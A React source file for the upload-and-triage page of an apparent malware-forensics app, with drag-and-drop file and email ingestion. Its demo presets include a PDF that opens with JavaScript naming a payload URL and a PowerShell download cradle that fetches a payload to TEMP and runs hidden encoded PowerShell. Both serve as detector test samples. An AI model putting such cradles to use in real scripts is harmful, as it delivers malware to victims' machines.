import React, { useState, useRef } from 'react';
import {
  Upload,
  AlertCircle,
  ShieldAlert,
  ArrowRight,
  CheckCircle2,
  RefreshCw,
  FileCode,
  Network,
  Shield,
  ChevronDown,
  ChevronUp,
  Copy,
  Check,
  Sparkles,
  Mail,
  Inbox,
  FileText,
  Globe,
  ExternalLink,
  Lock,
  Layers,
  Download,
} from 'lucide-react';
import { api } from '../services/api';
import { InvestigationSummary, EvidenceItem, EmailExtractionResult, EmailAttachment } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface InvestigateProps {
  onInvestigationComplete: (id: string) => void;
  onNavigateToGraph: (id: string) => void;
  onNavigateToDetails: (id: string) => void;
  onNavigateToDefense?: (id: string) => void;
}

export const Investigate: React.FC<InvestigateProps> = ({
  onInvestigationComplete,
  onNavigateToGraph,
  onNavigateToDetails,
  onNavigateToDefense,
}) => {
  // Mode selection: 'file' or 'email'
  const [activeMode, setActiveMode] = useState<'file' | 'email'>('file');

  // File Upload State
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewSha256, setPreviewSha256] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);
  const [analyzing, setAnalyzing] = useState(false);
  const [analyzingTargetName, setAnalyzingTargetName] = useState<string>('');
  const [currentStage, setCurrentStage] = useState<number>(0);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<InvestigationSummary | null>(null);
  const [evidence, setEvidence] = useState<EvidenceItem[]>([]);
  const [showPopup, setShowPopup] = useState(false);
  const [showTechnicalDetails, setShowTechnicalDetails] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);

  // Email Extraction State
  const [emailResult, setEmailResult] = useState<EmailExtractionResult | null>(null);
  const [extractingEmail, setExtractingEmail] = useState(false);
  const [showPasteModal, setShowPasteModal] = useState(false);
  const [rawPastedEmail, setRawPastedEmail] = useState('');
  const [analyzingAttachmentId, setAnalyzingAttachmentId] = useState<string | null>(null);

  const inputRef = useRef<HTMLInputElement>(null);
  const emailInputRef = useRef<HTMLInputElement>(null);

  const calculateFileSha256 = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      setPreviewSha256(hashHex);
    } catch {
      setPreviewSha256(null);
    }
  };

  const handleSelectFile = (file: File) => {
    const isEmail =
      file.name.toLowerCase().endsWith('.eml') ||
      file.name.toLowerCase().endsWith('.msg') ||
      file.type === 'message/rfc822';

    if (isEmail) {
      setActiveMode('email');
      handleExtractEmailFile(file);
      return;
    }

    setSelectedFile(file);
    calculateFileSha256(file);
    setError(null);
    setResult(null);
  };

  const handleExtractEmailFile = async (file: File) => {
    try {
      setExtractingEmail(true);
      setError(null);
      const res = await api.extractEmail(file);
      setEmailResult(res);
      setSelectedFile(null);
    } catch (err: any) {
      setError(err.message || 'Failed to extract attachments from email');
    } finally {
      setExtractingEmail(false);
    }
  };

  const handleLoadDemoEmail = async () => {
    try {
      setExtractingEmail(true);
      setError(null);
      const demo = await api.getDemoEmailSample();
      const res = await api.extractEmail({ raw_email: demo.raw_eml });
      setEmailResult(res);
      setActiveMode('email');
    } catch (err: any) {
      setError(err.message || 'Failed to load demo phishing email');
    } finally {
      setExtractingEmail(false);
    }
  };

  const handleParsePastedEmail = async () => {
    if (!rawPastedEmail.trim()) return;
    try {
      setExtractingEmail(true);
      setError(null);
      const res = await api.extractEmail({ raw_email: rawPastedEmail });
      setEmailResult(res);
      setShowPasteModal(false);
      setRawPastedEmail('');
      setActiveMode('email');
    } catch (err: any) {
      setError(err.message || 'Failed to parse raw email text');
    } finally {
      setExtractingEmail(false);
    }
  };

  const handleAnalyzeExtractedAttachment = async (att: EmailAttachment) => {
    try {
      setAnalyzing(true);
      setAnalyzingTargetName(att.filename);
      setAnalyzingAttachmentId(att.id);
      setError(null);
      setResult(null);

      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const summaryRes = await api.analyzeEmailAttachment({
        filename: att.filename,
        data_base64: att.data_base64,
        content_type: att.content_type,
      });

      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(summaryRes.id),
        api.getEvidence(summaryRes.id),
      ]);

      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);
      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'Attachment forensic processing failed');
    } finally {
      setAnalyzing(false);
      setAnalyzingAttachmentId(null);
      setCurrentStage(0);
    }
  };

  const handleLoadDemoSample = (sampleType: 'exploit_pdf' | 'ps1_script' | 'benign_pdf') => {
    let file: File;
    if (sampleType === 'exploit_pdf') {
      const content =
        '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
      file = new File([content], 'urgent_invoice_action.pdf', { type: 'application/pdf' });
    } else if (sampleType === 'ps1_script') {
      const content =
        '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
      file = new File([content], 'system_update_cradle.ps1', { type: 'text/x-script' });
    } else {
      const content =
        '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n110\n%%EOF';
      file = new File([content], 'academic_research_proposal.pdf', { type: 'application/pdf' });
    }
    handleSelectFile(file);
  };

  const stages = [
    'Secure Ingestion & SHA-256 Nonce Verification',
    'Static Header & Magic Byte Validation',
    'YARA Signature Pattern Compilation & Matching',
    '14-Dimensional Structural Vector Engineering',
    'Supervised Random Forest & Isolation Forest Inference',
    'Causal Attack-Chain Topology Construction',
    'Forensic Incident Report Compilation',
  ];

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);

    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleSelectFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleSelectFile(e.target.files[0]);
    }
  };

  const startAnalysis = async () => {
    if (!selectedFile) return;

    try {
      setAnalyzing(true);
      setAnalyzingTargetName(selectedFile.name);
      setError(null);
      setResult(null);

      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const uploadRes = await api.analyzeFile(selectedFile);
      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(uploadRes.id),
        api.getEvidence(uploadRes.id),
      ]);
      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);

      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'File forensics processing error. Please verify backend is running.');
    } finally {
      setAnalyzing(false);
      setCurrentStage(0);
    }
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto pb-10">
      {/* Header Banner */}
      <div className="p-6 rounded-3xl border border-slate-200 bg-white flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-xs">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-xl font-bold text-slate-900 flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-indigo-600" />
              <span>Multi-Layer File Forensics & Triage</span>
            </h1>
            <span className="text-[10px] uppercase font-bold px-2.5 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200">
              Sandboxed
            </span>
          </div>
          <p className="text-xs text-slate-500 mt-1">
            Safely inspect suspicious PDFs, binaries, macros, scripts, and email attachments without executing or downloading untrusted files.
          </p>
        </div>

        {/* Quick Sample Presets */}
        <div className="flex items-center gap-2 shrink-0 flex-wrap">
          <span className="text-xs text-slate-400 font-medium">Quick Presets:</span>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('benign_pdf');
            }}
            className="px-3 py-1.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Clean PDF
          </button>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('exploit_pdf');
            }}
            className="px-3 py-1.5 rounded-xl border border-rose-200 bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Exploit PDF
          </button>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('ps1_script');
            }}
            className="px-3 py-1.5 rounded-xl border border-amber-200 bg-amber-50 hover:bg-amber-100 text-amber-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            PowerShell Cradle
          </button>
          <button
            onClick={handleLoadDemoEmail}
            className="px-3 py-1.5 rounded-xl border border-purple-200 bg-purple-50 hover:bg-purple-100 text-purple-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5"
          >
            <Mail className="w-3.5 h-3.5" />
            <span>Phishing Email Sample</span>
          </button>
        </div>
      </div>

      {/* Mode Switcher Tabs */}
      <div className="flex items-center gap-2 bg-slate-100 p-1.5 rounded-2xl w-fit border border-slate-200">
        <button
          onClick={() => setActiveMode('file')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
            activeMode === 'file'
              ? 'bg-white text-indigo-700 shadow-xs border border-slate-200'
              : 'text-slate-600 hover:text-slate-900'
          }`}
        >
          <Upload className="w-4 h-4" />
          <span>Direct File Drag & Drop</span>
        </button>

        <button
          onClick={() => setActiveMode('email')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
            activeMode === 'email'
              ? 'bg-white text-indigo-700 shadow-xs border border-slate-200'
              : 'text-slate-600 hover:text-slate-900'
          }`}
        >
          <Mail className="w-4 h-4 text-indigo-600" />
          <span>Email Attachment Extractor (Direct Ingestion)</span>
          <span className="text-[10px] px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-600 font-semibold border border-indigo-200">
            No Download Needed
          </span>
        </button>
      </div>

      {/* MODE 1: Standard File Drag & Drop */}
      {activeMode === 'file' && (
        <div className="space-y-4">
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={handleFileDrop}
            onClick={() => inputRef.current?.click()}
            className={`p-10 rounded-3xl border-2 border-dashed text-center transition-all cursor-pointer bg-white shadow-xs ${
              dragActive
                ? 'border-indigo-500 bg-indigo-50/60 scale-[1.01]'
                : selectedFile
                ? 'border-indigo-400 bg-indigo-50/20'
                : 'border-slate-300 hover:border-indigo-400 hover:bg-slate-50/60'
            }`}
          >
            <input
              ref={inputRef}
              type="file"
              onChange={handleFileChange}
              className="hidden"
            />

            <div className="w-14 h-14 rounded-2xl border border-indigo-100 bg-indigo-50 flex items-center justify-center mx-auto mb-3 text-indigo-600 shadow-xs">
              <Upload className="w-7 h-7 text-indigo-600" />
            </div>

            {selectedFile ? (
              <div className="space-y-1.5">
                <div className="text-base font-bold text-slate-900 flex items-center justify-center gap-2">
                  <FileCode className="w-5 h-5 text-indigo-600" />
                  <span>{selectedFile.name}</span>
                </div>
                <div className="text-xs text-slate-500 font-mono">
                  Size: {(selectedFile.size / 1024).toFixed(1)} KB • Type: {selectedFile.type || 'Binary / Unspecified'}
                </div>
                {previewSha256 && (
                  <div className="text-[11px] font-mono text-slate-500 pt-1">
                    SHA-256: <span className="text-slate-800 select-all font-semibold">{previewSha256}</span>
                  </div>
                )}
                <div className="text-[11px] text-slate-400 pt-2 font-mono">
                  Click or drag another file to replace (or drop .eml / .msg to extract attachments)
                </div>
              </div>
            ) : (
              <div>
                <div className="text-base font-bold text-slate-900">
                  Select or drag and drop a suspicious file or email here
                </div>
                <div className="text-xs text-slate-500 mt-1">
                  Supports binaries (.exe, .dll, .elf), documents (.pdf, .docm), scripts, and email (.eml, .msg)
                </div>
              </div>
            )}
          </div>

          {/* Action Buttons for Selected File */}
          {selectedFile && !analyzing && !result && (
            <div className="flex items-center justify-end gap-3">
              <button
                onClick={() => setSelectedFile(null)}
                className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-100 text-xs font-semibold text-slate-600 cursor-pointer transition-colors"
              >
                Clear Selection
              </button>
              <button
                onClick={startAnalysis}
                className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs font-semibold shadow-md shadow-indigo-500/20 cursor-pointer transition-all active:scale-95"
              >
                <ShieldAlert className="w-4 h-4 text-white" />
                <span>Execute Forensic Analysis</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* MODE 2: Email Attachment Extractor (Direct Drag & Drop) */}
      {activeMode === 'email' && (
        <div className="space-y-6">
          {/* Email Drop Zone */}
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={(e) => {
              e.preventDefault();
              setDragActive(false);
              if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                handleExtractEmailFile(e.dataTransfer.files[0]);
              }
            }}
            onClick={() => emailInputRef.current?.click()}
            className={`p-10 rounded-3xl border-2 border-dashed text-center transition-all cursor-pointer bg-white shadow-xs ${
              dragActive
                ? 'border-purple-500 bg-purple-50/60 scale-[1.01]'
                : emailResult
                ? 'border-purple-300 bg-purple-50/20'
                : 'border-slate-300 hover:border-purple-400 hover:bg-purple-50/30'
            }`}
          >
            <input
              ref={emailInputRef}
              type="file"
              accept=".eml,.msg,message/rfc822"
              onChange={(e) => {
                if (e.target.files && e.target.files[0]) {
                  handleExtractEmailFile(e.target.files[0]);
                }
              }}
              className="hidden"
            />

            <div className="w-14 h-14 rounded-2xl border border-purple-100 bg-purple-50 flex items-center justify-center mx-auto mb-3 text-purple-600 shadow-xs">
              <Mail className="w-7 h-7 text-purple-600" />
            </div>

            <div className="text-base font-bold text-slate-900">
              Drag & Drop an Email (.eml, .msg) directly from your mail client or webmail
            </div>
            <p className="text-xs text-slate-500 mt-1 max-w-xl mx-auto">
              Extracts and isolates embedded file attachments in secure memory. You can inspect and analyze attachments directly in the sandbox without downloading them to your computer.
            </p>

            <div className="flex items-center justify-center gap-3 mt-4 pt-2 border-t border-slate-100">
              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  handleLoadDemoEmail();
                }}
                className="px-3.5 py-1.5 rounded-xl border border-purple-200 bg-purple-50 hover:bg-purple-100 text-purple-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5"
              >
                <Sparkles className="w-3.5 h-3.5" />
                <span>Load Demo Phishing Email</span>
              </button>

              <button
                type="button"
                onClick={(e) => {
                  e.stopPropagation();
                  setShowPasteModal(true);
                }}
                className="px-3.5 py-1.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5"
              >
                <FileText className="w-3.5 h-3.5 text-slate-500" />
                <span>Paste Raw Email Source</span>
              </button>
            </div>
          </div>

          {/* Email Extraction Loading */}
          {extractingEmail && (
            <div className="p-6 rounded-3xl border border-purple-200 bg-purple-50/50 flex items-center justify-center gap-3 text-purple-800 text-sm font-semibold">
              <RefreshCw className="w-5 h-5 animate-spin text-purple-600" />
              <span>Parsing email MIME headers and extracting in-memory attachments...</span>
            </div>
          )}

          {/* Extracted Email Details & Attachments View */}
          {emailResult && !extractingEmail && (
            <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-6 shadow-xs">
              {/* Email Meta Card */}
              <div className="flex flex-col md:flex-row md:items-start justify-between gap-4 pb-4 border-b border-slate-100">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] uppercase font-bold font-mono px-2 py-0.5 rounded-md bg-purple-50 text-purple-700 border border-purple-200">
                      {emailResult.email_format}
                    </span>
                    <span className="text-xs text-slate-400 font-mono">{emailResult.original_name}</span>
                  </div>
                  <h3 className="text-lg font-bold text-slate-900">{emailResult.subject}</h3>
                  <div className="text-xs text-slate-600 space-y-0.5 pt-1">
                    <div>
                      <span className="font-semibold text-slate-400">From: </span>
                      <span className="font-mono text-slate-800 font-medium">{emailResult.sender}</span>
                    </div>
                    <div>
                      <span className="font-semibold text-slate-400">To: </span>
                      <span className="font-mono text-slate-700">{emailResult.recipient}</span>
                    </div>
                    {emailResult.date && (
                      <div>
                        <span className="font-semibold text-slate-400">Date: </span>
                        <span className="text-slate-500">{emailResult.date}</span>
                      </div>
                    )}
                  </div>
                </div>

                {/* Security Badges */}
                <div className="flex flex-wrap md:flex-col items-end gap-2 shrink-0">
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-semibold text-slate-500">SPF:</span>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                        emailResult.spf_status === 'PASS'
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : emailResult.spf_status === 'FAIL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200 font-mono'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {emailResult.spf_status}
                    </span>
                    <span className="text-[11px] font-semibold text-slate-500 ml-2">DKIM:</span>
                    <span
                      className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                        emailResult.dkim_status === 'PASS'
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : emailResult.dkim_status === 'FAIL'
                          ? 'bg-rose-50 text-rose-700 border-rose-200 font-mono'
                          : 'bg-slate-100 text-slate-600 border-slate-200'
                      }`}
                    >
                      {emailResult.dkim_status}
                    </span>
                  </div>

                  {emailResult.originating_ip && (
                    <div className="text-[11px] font-mono text-slate-500 bg-slate-50 px-2 py-1 rounded-lg border border-slate-100">
                      Originating IP: <span className="font-semibold text-slate-800">{emailResult.originating_ip}</span>
                    </div>
                  )}

                  <button
                    onClick={() => setEmailResult(null)}
                    className="text-xs text-slate-400 hover:text-slate-600 underline pt-1 cursor-pointer"
                  >
                    Clear Email
                  </button>
                </div>
              </div>

              {/* Suspicious URLs Warning Banner */}
              {emailResult.embedded_urls && emailResult.embedded_urls.length > 0 && (
                <div className="p-4 rounded-2xl bg-amber-50 border border-amber-200 space-y-2">
                  <div className="flex items-center gap-2 text-xs font-bold text-amber-900">
                    <Globe className="w-4 h-4 text-amber-600" />
                    <span>Embedded Hyperlinks Detected in Email Body ({emailResult.embedded_urls.length})</span>
                  </div>
                  <div className="space-y-1">
                    {emailResult.embedded_urls.map((u, i) => (
                      <div key={i} className="flex items-center justify-between text-xs font-mono bg-white p-2 rounded-xl border border-amber-100">
                        <span className="text-slate-700 truncate max-w-xl">{u.url}</span>
                        {u.is_suspicious && (
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-rose-50 text-rose-700 border border-rose-200 shrink-0">
                            Suspicious / Phishing Indicator
                          </span>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Extracted File Attachments */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <h4 className="text-sm font-bold text-slate-900">Extracted In-Memory File Attachments</h4>
                    <span className="text-xs px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 font-bold border border-indigo-200">
                      {emailResult.attachments.length} Found
                    </span>
                  </div>
                  <span className="text-[11px] text-slate-400 font-medium">
                    Analyze directly without downloading to local disk
                  </span>
                </div>

                {emailResult.attachments.length === 0 ? (
                  <div className="p-8 text-center text-xs text-slate-500 bg-slate-50 rounded-2xl border border-slate-100">
                    No binary file attachments found in this email message.
                  </div>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {emailResult.attachments.map((att) => {
                      const isAnalyzingThis = analyzing && analyzingAttachmentId === att.id;
                      return (
                        <div
                          key={att.id}
                          className={`p-4 rounded-2xl border transition-all bg-white flex flex-col justify-between ${
                            att.is_suspicious
                              ? 'border-rose-200 shadow-xs hover:border-rose-300'
                              : 'border-slate-200 shadow-xs hover:border-slate-300'
                          }`}
                        >
                          <div>
                            <div className="flex items-start justify-between gap-2 pb-2">
                              <div className="flex items-center gap-2.5">
                                <div className={`p-2 rounded-xl ${att.is_suspicious ? 'bg-rose-50 text-rose-600' : 'bg-indigo-50 text-indigo-600'}`}>
                                  <FileCode className="w-5 h-5" />
                                </div>
                                <div>
                                  <div className="text-xs font-bold text-slate-900 break-all">{att.filename}</div>
                                  <div className="text-[11px] text-slate-400 font-mono">
                                    {(att.size_bytes / 1024).toFixed(1)} KB • {att.content_type}
                                  </div>
                                </div>
                              </div>

                              {att.is_suspicious && (
                                <span className="text-[10px] font-bold px-2 py-0.5 rounded-md bg-rose-50 text-rose-700 border border-rose-200 shrink-0">
                                  High Risk Extension
                                </span>
                              )}
                            </div>

                            <div className="mt-2 p-2 rounded-xl bg-slate-50 border border-slate-100 text-[10px] font-mono text-slate-500 space-y-0.5">
                              <div className="truncate">
                                <span className="text-slate-400 font-semibold">SHA-256: </span>
                                <span className="text-slate-800">{att.sha256}</span>
                              </div>
                            </div>
                          </div>

                          <div className="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between gap-2">
                            <span className="text-[10px] text-emerald-700 font-semibold flex items-center gap-1">
                              <CheckCircle2 className="w-3.5 h-3.5" />
                              <span>Isolated in Memory</span>
                            </span>

                            <button
                              disabled={analyzing}
                              onClick={() => handleAnalyzeExtractedAttachment(att)}
                              className={`flex items-center gap-1.5 px-3.5 py-1.5 rounded-xl text-xs font-semibold transition-all cursor-pointer ${
                                isAnalyzingThis
                                  ? 'bg-indigo-100 text-indigo-700'
                                  : 'bg-indigo-600 hover:bg-indigo-700 text-white shadow-xs active:scale-95'
                              }`}
                            >
                              {isAnalyzingThis ? (
                                <>
                                  <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                  <span>Analyzing...</span>
                                </>
                              ) : (
                                <>
                                  <ShieldAlert className="w-3.5 h-3.5 text-white" />
                                  <span>Analyze In Sandbox</span>
                                </>
                              )}
                            </button>
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* Paste Raw Email Modal */}
      {showPasteModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/50 backdrop-blur-xs p-4">
          <div className="w-full max-w-2xl rounded-3xl bg-white border border-slate-200 p-6 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <div className="flex items-center gap-2 font-bold text-slate-900 text-base">
                <FileText className="w-5 h-5 text-purple-600" />
                <span>Paste Raw RFC 822 Email Source / MIME Headers</span>
              </div>
              <button
                onClick={() => setShowPasteModal(false)}
                className="text-slate-400 hover:text-slate-600 text-xs font-semibold cursor-pointer"
              >
                Cancel
              </button>
            </div>

            <p className="text-xs text-slate-500">
              Copy the raw email source from Gmail ("Show original") or Outlook ("View message source") and paste below to extract all attachments in-memory.
            </p>

            <textarea
              rows={8}
              value={rawPastedEmail}
              onChange={(e) => setRawPastedEmail(e.target.value)}
              placeholder="From: sender@domain.com&#10;To: recipient@corp.com&#10;Subject: Urgent Document&#10;Content-Type: multipart/mixed; boundary=...&#10;&#10;--boundary..."
              className="w-full p-3 rounded-2xl border border-slate-200 bg-slate-50 font-mono text-xs text-slate-800 focus:outline-none focus:border-purple-500 focus:bg-white resize-none"
            />

            <div className="flex items-center justify-end gap-3 pt-2">
              <button
                onClick={() => setShowPasteModal(false)}
                className="px-4 py-2 rounded-xl border border-slate-200 text-xs font-semibold text-slate-600 hover:bg-slate-100 cursor-pointer"
              >
                Close
              </button>
              <button
                disabled={!rawPastedEmail.trim() || extractingEmail}
                onClick={handleParsePastedEmail}
                className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-purple-600 hover:bg-purple-700 text-white text-xs font-semibold cursor-pointer disabled:opacity-50"
              >
                {extractingEmail ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    <span>Extracting...</span>
                  </>
                ) : (
                  <>
                    <Mail className="w-4 h-4" />
                    <span>Extract Attachments</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded-2xl bg-rose-50 border border-rose-200 text-rose-800 text-xs flex items-center gap-3">
          <AlertCircle className="w-5 h-5 shrink-0 text-rose-600" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Progress */}
      {analyzing && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-4 shadow-xs">
          <div className="flex items-center justify-between text-xs">
            <span className="font-bold text-slate-900 flex items-center gap-2">
              <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin" />
              <span>Analyzing Target: {analyzingTargetName || selectedFile?.name}</span>
            </span>
            <span className="text-indigo-600 font-mono text-[11px] font-bold">
              Stage {Math.min(currentStage + 1, stages.length)} / {stages.length}
            </span>
          </div>

          {/* Progress Bar */}
          <div className="w-full bg-slate-100 rounded-full h-2 overflow-hidden border border-slate-200">
            <div
              className="bg-indigo-600 h-2 rounded-full transition-all duration-300"
              style={{ width: `${((currentStage + 1) / stages.length) * 100}%` }}
            ></div>
          </div>

          {/* Stages List */}
          <div className="grid grid-cols-1 gap-1.5 pt-1 text-xs">
            {stages.map((st, i) => {
              const isPast = i < currentStage;
              const isCurr = i === currentStage;
              return (
                <div
                  key={i}
                  className={`flex items-center gap-2.5 px-3 py-2 rounded-xl text-[11px] transition-colors ${
                    isCurr
                      ? 'bg-indigo-50 text-indigo-900 font-bold border border-indigo-200'
                      : isPast
                      ? 'text-slate-600'
                      : 'text-slate-400'
                  }`}
                >
                  {isPast ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                  ) : isCurr ? (
                    <RefreshCw className="w-4 h-4 text-indigo-600 animate-spin shrink-0" />
                  ) : (
                    <div className="w-3.5 h-3.5 rounded-full border border-slate-300 shrink-0"></div>
                  )}
                  <span>{st}</span>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* Analysis Result Card */}
      {result && (
        <div className="p-6 rounded-3xl border border-slate-200 bg-white space-y-5 shadow-xs">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-slate-100">
            <div>
              <div className="text-[10px] text-slate-400 uppercase tracking-wider font-mono">Triage Complete</div>
              <h2 className="text-base font-bold text-slate-900">{result.original_name}</h2>
              <div className="flex items-center gap-1.5 text-[11px] text-slate-500 font-mono mt-0.5">
                <span>SHA-256: {result.sha256}</span>
                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(result.sha256);
                    setCopiedHash(true);
                    setTimeout(() => setCopiedHash(false), 2000);
                  }}
                  className="p-1 rounded-lg hover:bg-slate-100 text-slate-400 hover:text-slate-700 cursor-pointer transition-colors"
                  title="Copy SHA-256 hash"
                >
                  {copiedHash ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 self-start sm:self-auto">
              <span
                className={`text-xs font-bold font-mono px-3.5 py-1.5 rounded-xl border ${
                  result.risk_level === 'CRITICAL'
                    ? 'bg-rose-50 text-rose-700 border-rose-200'
                    : result.risk_level === 'HIGH'
                    ? 'bg-amber-50 text-amber-700 border-amber-200'
                    : result.risk_level === 'MEDIUM'
                    ? 'bg-yellow-50 text-yellow-800 border-yellow-200'
                    : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                }`}
              >
                {result.risk_level} RISK
              </span>
              <div className="text-right">
                <div className="text-lg font-black text-slate-900 font-mono">
                  {result.risk_score.toFixed(1)}
                  <span className="text-xs text-slate-400 font-normal">/100</span>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Actions */}
          <div className="flex flex-wrap items-center gap-2.5 pt-1">
            <button
              onClick={() => onNavigateToGraph(result.id)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-white text-xs font-semibold transition-all cursor-pointer shadow-xs active:scale-95"
            >
              <Network className="w-4 h-4 text-indigo-400" />
              <span>Explore Reconstructed Attack Graph</span>
              <ArrowRight className="w-3.5 h-3.5 text-slate-400" />
            </button>

            {onNavigateToDefense && (
              <button
                onClick={() => onNavigateToDefense(result.id)}
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 text-xs font-semibold transition-all cursor-pointer active:scale-95"
              >
                <Shield className="w-4 h-4 text-indigo-600" />
                <span>Simulate Defensive Countermeasures</span>
              </button>
            )}

            <button
              onClick={() => onNavigateToDetails(result.id)}
              className="flex items-center gap-2 px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-semibold transition-all cursor-pointer"
            >
              <FileCode className="w-4 h-4 text-slate-500" />
              <span>Full Forensic Dossier</span>
            </button>

            <button
